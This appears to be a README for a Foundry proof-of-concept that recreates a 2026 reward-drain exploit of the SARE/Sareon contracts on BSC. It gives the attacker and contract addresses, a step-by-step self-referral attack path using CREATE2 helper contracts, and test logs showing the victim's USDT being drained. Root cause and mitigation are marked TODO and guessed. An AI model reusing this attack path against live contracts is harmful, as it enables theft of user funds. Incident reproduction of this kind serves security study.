# 2026-03-Recreate-Sareon-SARE-Exploit
Recreate a POC from SARE / Sareon exploit, which happened on BSC.

## KeyInfo

- Total Lost                        : ~9,000 USD

- Attacker                          : [0xfA4EE59836eb16609A643bF41C961065B88fA641](https://bscscan.com/address/0xfA4EE59836eb16609A643bF41C961065B88fA641)

- Attack Contract                   : [0xbE876B08bEF10Ff9bc7483Cab1f6AdA122740b4c](https://bscscan.com/address/0xbE876B08bEF10Ff9bc7483Cab1f6AdA122740b4c)

- Vulnerable Contract               :

  - [SARE Contract](https://bscscan.com/address/0x1356062E82a940A98ff7172bA1093e206b775015)
  - [Sareon Implementation](https://bscscan.com/address/0x51F61CEf27e2fAdb767D1A7f7277c9fD9Ab3fbE9)

- Attack Tx                         : [0x53303ea516cb64cd4120c1b344d1be2d4cca03dbfdb7924ce2421c235a5f28c8](https://app.blocksec.com/phalcon/explorer/tx/bsc/0x53303ea516cb64cd4120c1b344d1be2d4cca03dbfdb7924ce2421c235a5f28c8)


## Root Cause

- Vulnerability name            : Reward Drain

- Protocol affected             : [SARE / Sareon](https://bscscan.com/address/0x1356062E82a940A98ff7172bA1093e206b775015)

- Root cause                    : TODO — confirm from contract source and post-mortem.

  From the POC logic: the attacker registers a referrer address, then repeatedly deploys disposable `AttackHelper` contracts (29 iterations via `CREATE2`) — each one approves USDT, registers with the attacker as referrer, and calls `BuyToken()`. This inflates the attacker's referral/sponsor reward balance inside the Sareon contract. The attacker then calls `claimUSDTRewards()` to drain the accumulated reward.

- Broken invariant              : TODO — confirm from contract source.

  Likely: referral rewards must not be claimable beyond the protocol's actual USDT reserve, or a single address should not be able to accumulate unbounded rewards through self-referral loops.

- Attack path (step-by-step)    :
  1. Swap 0.3 BNB → USDT via PancakeSwap Router v2
  2. Approve USDT → SARE and PancakeSwap Router v2
  3. `SARE.idToAddress(1)` to get the referrer address
  4. `SARE.register(referrer)` — attacker registers under referrer
  5. `SARE.BuyToken(1e18)` — initial buy to set up attacker's account
  6. Loop 30 times via `CREATE2`:
     - Deploy fresh `AttackHelper` contract
     - Transfer `1e18` USDT to helper
     - Helper calls `approve` + `register(attacker)` + `BuyToken(1e18)`
     - Each iteration inflates attacker's referral reward balance
  7. `SARE.getUserIncome(attacker)` to read accumulated reward
  8. `SARE.claimUSDTRewards(rewardAmount - 1)` — drain the USDT reward

- Prevention / mitigation       : TODO — confirm from root cause.

  Likely: cap referral rewards per address per block, or track and limit self-referral loops. Rate-limiting `BuyToken` calls from freshly deployed contracts would also reduce attack surface.


## Analysis

- Post-mortem : https://www.clarahacks.com/incidents/ad818236-4f35-4c88-8f47-90de0513ed3a

- Twitter     :
  - https://x.com/DefimonAlerts/status/2032360939836571715


## Run the POC

To run the POC please copy the `Sareon_exploit.t.sol` file to your Foundry project `test` folder.
Don't forget to change your RPC URL too.

Then run it on terminal with this command:

```bash
forge test --mp test/2026-03/SAREON/Sareon_exploit.t.sol -vv
```


## Test Output

```bash
Ran 1 test for test/2026-03/Sareon/Sareon_exploit.t.sol:SareonExploit
[PASS] test_sareExploit() (gas: 20240546)
Logs:
  ------------------------------------------------------------------------
  [START ] address(this) USDT Balance: 26.542161622221038197
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [START ] Victim Address Sareon USDT Balance: 9777.068000000000000000
  ------------------------------------------------------------------------
  |
  1. Swap 0.3 BNB -> USDT via PancakeSwap Router v2
  Balance USDT now:  219009535557130604297
  |
  2. Approve USDT -> SARE
  |
  3. Approve USDT -> PancakeSwap Router v2
  |
  4. Get referrer address via SARE.idToAddress(1)
     Referrer: 0x3F2E04A3fA917837E4eBc30768D7984F6ce42Bcd
  |
  5. SARE.register(referrer) -> delegatecall to Sareon
  |
  6. SARE.BuyToken(1_000_000_000_000_000_000) [1st] -> creates helper contract
  |
  7. USDT.transfer -> helper contract 
  |
  8. helperContract.execute() -> approve USDT -> SARE, register again, BuyToken again, repeat !
  on nonce:  1  the reward on address is  0
  on nonce:  2  the reward on address is  0
  on nonce:  3  the reward on address is  0
  on nonce:  4  the reward on address is  0
  on nonce:  5  the reward on address is  0
  on nonce:  6  the reward on address is  0
  on nonce:  7  the reward on address is  0
  on nonce:  8  the reward on address is  0
  on nonce:  9  the reward on address is  0
  on nonce:  10  the reward on address is  600000000000000000000
  on nonce:  11  the reward on address is  1200000000000000000000
  on nonce:  12  the reward on address is  1800000000000000000000
  on nonce:  13  the reward on address is  2400000000000000000000
  on nonce:  14  the reward on address is  3000000000000000000000
  on nonce:  15  the reward on address is  3600000000000000000000
  on nonce:  16  the reward on address is  4200000000000000000000
  on nonce:  17  the reward on address is  4800000000000000000000
  on nonce:  18  the reward on address is  5400000000000000000000
  on nonce:  19  the reward on address is  6000000000000000000000
  on nonce:  20  the reward on address is  6600000000000000000000
  on nonce:  21  the reward on address is  7200000000000000000000
  on nonce:  22  the reward on address is  7800000000000000000000
  on nonce:  23  the reward on address is  8400000000000000000000
  on nonce:  24  the reward on address is  9000000000000000000000
  on nonce:  25  the reward on address is  9600000000000000000000
  on nonce:  26  the reward on address is  10200000000000000000000
  on nonce:  27  the reward on address is  10800000000000000000000
  on nonce:  28  the reward on address is  11400000000000000000000
  on nonce:  29  the reward on address is  12000000000000000000000
  |
  9. Get the rewardAmount to claim the USDT reward from the Sareon contract
  10. Comparison Balance Usdt before:  219009535557130604297 vs Balance Usdt after:  9789009535557130604296
  ------------------------------------------------------------------------
  [FINISH] address(this) USDT Balance: 9789.009535557130604296
  ------------------------------------------------------------------------
  ------------------------------------------------------------------------
  [FINISH] Victim Address Sareon USDT Balance: 207.068000000000000001
  ------------------------------------------------------------------------

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 195.29s (194.52s CPU time)

Ran 1 test suite in 195.29s (195.29s CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```